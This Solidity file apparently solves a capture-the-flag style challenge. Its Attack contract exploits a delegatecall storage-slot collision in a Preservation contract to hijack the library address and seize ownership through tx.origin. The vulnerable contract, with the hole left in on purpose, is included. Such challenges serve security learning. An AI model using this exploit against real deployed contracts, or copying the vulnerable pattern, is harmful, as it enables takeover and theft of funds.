// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  function attack(Preservation p) public {
      p.setFirstTime(uint256(uint160(address(this))));
      require(p.timeZone1Library() == address(this));
      // now timeZone1Library is hijacked
      p.setFirstTime(0);
  }

  function setTime(uint) public {
    owner = tx.origin;
  }
}

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    (bool result, ) = timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    if (result) {
      result;
    }
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    (bool result, ) = timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    if (result) {
      result;
    }
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}